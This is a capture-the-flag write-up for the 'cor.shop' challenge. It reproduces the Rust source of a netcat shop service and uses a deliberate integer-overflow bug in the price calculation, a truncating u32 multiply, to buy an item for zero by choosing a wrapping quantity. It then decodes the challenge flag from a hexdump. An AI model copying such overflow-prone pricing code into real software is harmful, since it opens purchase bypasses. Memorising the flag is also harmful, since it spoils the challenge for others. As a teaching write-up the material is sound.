# cor.shop

```
Who even uses GUIs anymore? As FizzBuzz101 once said so perfectly: “I don't believe in GUI.” People are finally waking up — ordering coffee over SSH, trading bloated Electron editors for the elegance of Neovim.

At CoR, we couldn't be happier to support this movement. That's why we built a fun little shop you can access right from your terminal, where you can snag personal items from CoR members themselves!

nc ctfi.ng 31417
```

At first, we can find a menu and download its source code:

```shell
$ nc ctfi.ng 31417
=====================================
         Welcome to cor.shop
=====================================
Commands:
  list                 - show products
  buy <id> <qty>       - attempt to purchase
  balance              - show your balance
  help                 - show this help
  quit                 - disconnect


Balance: 0 corns
> list
ID  |   PRICE | NAME
----+-------+------------------------------
1   |  250000 | FizzBuzz101's tears
2   |  400000 | One Clubby hair
3   |  600000 | Day's Heap
4   |       0 | cor.shop's source code
> buy 4 1
Purchased 1 x cor.shop's source code for 0 corns.
use std::env;
use std::io::{self, BufRead, BufReader, Write};

#[derive(Clone, Copy)]
struct Item { id: u32, name: &'static str, price: u64 }

fn items() -> Vec<Item> { vec![
    Item { id: 1, name: "FizzBuzz101's tears", price: 250_000 },
    Item { id: 2, name: "One Clubby hair", price: 400_000 },
    Item { id: 3, name: "Day's Heap", price: 600_000 },
    Item { id: 4, name: "cor.shop's source code", price: 0}
]}

fn banner() -> &'static str { r#"=====================================
         Welcome to cor.shop
=====================================
Commands:
  list                 - show products
  buy <id> <qty>       - attempt to purchase
  balance              - show your balance
  help                 - show this help
  quit                 - disconnect

"# }

const SOURCE: &str = include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/", file!()));

fn shop<R: BufRead, W: Write>(mut reader: R, mut writer: W, heap: &str) {
    let mut balance: u64 = 0;
    let _ = writeln!(writer, "{}", banner());
    let _ = writeln!(writer, "Balance: {} corns", balance);

    loop {
        // Print prompt
        let _ = write!(writer, "> ");
        let _ = writer.flush();

        // Read user input
        let mut line = String::new();
        if reader.read_line(&mut line).unwrap_or(0) == 0 { break; }
        let line = line.trim();
        if line.is_empty() { continue; }

        // Parse out the command
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or("");

        match cmd {
            "list" => {
                // List table of our items
                let _ = writeln!(writer, "{:<3} | {:>7} | {}", "ID", "PRICE", "NAME");
                let _ = writeln!(writer, "----+-------+------------------------------");
                for it in items() {
                    let _ = writeln!(writer, "{:<3} | {:>7} | {}", it.id, it.price, it.name);
                }
            }
            "balance" => {
                // Show the current balance in corns
                let _ = writeln!(writer, "Balance: {} corns", balance);
            }
            "buy" => {
                // Attempt to parse the id and quantity, else fall back to id 0 and qty 1.
                let id: u32 = parts.next().and_then(|i| i.parse().ok()).unwrap_or(0);
                let qty: u32 = parts.next().and_then(|q| q.parse().ok()).unwrap_or(1);

                if qty == 0 {
                    // ???
                    let _ = writeln!(
                        writer,
                        "Thats not how buying stuff works.",
                    );
                    continue;
                }

                if let Some(item) = items().into_iter().find(|it| it.id == id) {
                    // Calculate the total cost of this purchase
                    let total: u64 = (item.price as u32 * qty) as u64;

                    if balance >= total {
                        // User can purchase, handle the purchase
                        balance = balance - total;
                        let _ = writeln!(
                            writer,
                            "Purchased {} x {} for {} corns.",
                            qty, item.name, total
                        );
                        // We need to take quantities into account sometime but its not like people got any corn.
                        if item.id == 1 {
                            let _ = writeln!(
                                writer,
                                "(╥﹏╥)",
                            );
                        } else if item.id == 2 {
                            let _ = writeln!(
                                writer,
                                "-ˋˏ✄┈┈┈┈",
                            );
                        } else if item.id == 3 {
                            let _ = writeln!(
                                writer,
                                "{}",
                                heap
                            );
                        } else if item.id == 4 {
                            let _ = writeln!(
                                writer,
                                "{}",
                                SOURCE
                            );
                        }
                    } else {
                        // User should seriously invest in some corns
                        let _ = writeln!(
                            writer,
                            "Insufficient balance. Need {}, have {}.",
                            total, balance
                        );
                    }
                } else {
                    // I mean this is what we get for only having 3 products...
                    let _ = writeln!(writer, "Unknown item id. Try `list`.");
                }
            }
            "help" => { let _ = writeln!(writer, "{}", banner()); }
            "quit" | "exit" => { let _ = writeln!(writer, "bye!"); break; }
            _ => { let _ = writeln!(writer, "Unknown command. Try `help`."); }
        }
    }
}

fn main() -> io::Result<()> {
    let heap = env::var("HEAP").unwrap_or_else(|_| "Got some random garbage, are you running this on your own machine or something?".to_string());
    let stdin = io::stdin();
    let stdout = io::stdout();
    let reader = BufReader::new(stdin.lock());
    let writer = stdout.lock();
    shop(reader, writer, &heap);
    Ok(())
}
>
```

Reading the code, there is a integer overflow:

```rust
let total: u64 = (item.price as u32 * qty) as u64;
```

If we allow `item.price as u32 * qty` to be a multiple of `2**32`, then we can buy it. The flag might be hidden in the heap item, so we find the quantity for it:

```python
>>> math.lcm(2**32, 600000)//600000
67108864
```

Buy it using the computed quantity:

```shell
$ nc ctfi.ng 31417
=====================================
         Welcome to cor.shop
=====================================
Commands:
  list                 - show products
  buy <id> <qty>       - attempt to purchase
  balance              - show your balance
  help                 - show this help
  quit                 - disconnect


Balance: 0 corns
> buy 3 67108864
Purchased 67108864 x Day's Heap for 0 corns.
0x804b000:      0x00000000      0x00000069      0x63726f63      0x737b6674
0x804b010:      0x72707275      0x5f337331      0x5f737431      0x70617277
0x804b020:      0x5f643370      0x5f646e34      0x33337266      0x0000007d
0x804b030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b060:      0x00000000      0x00000000      0x00000068      0x00000069
0x804b070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0d0:      0x00000000      0x00020f31      0x00000000      0x00000000
0x804b0e0:      0x00000000      0x00000000      0x00000000      0x00000000
>
```

Decode the text in the hexdump:

```python
>>> bytes.fromhex("636f726374667b73757270723173335f3174735f777261707033645f346e645f667233337d")
b'corctf{surpr1s3_1ts_wrapp3d_4nd_fr33}'
```
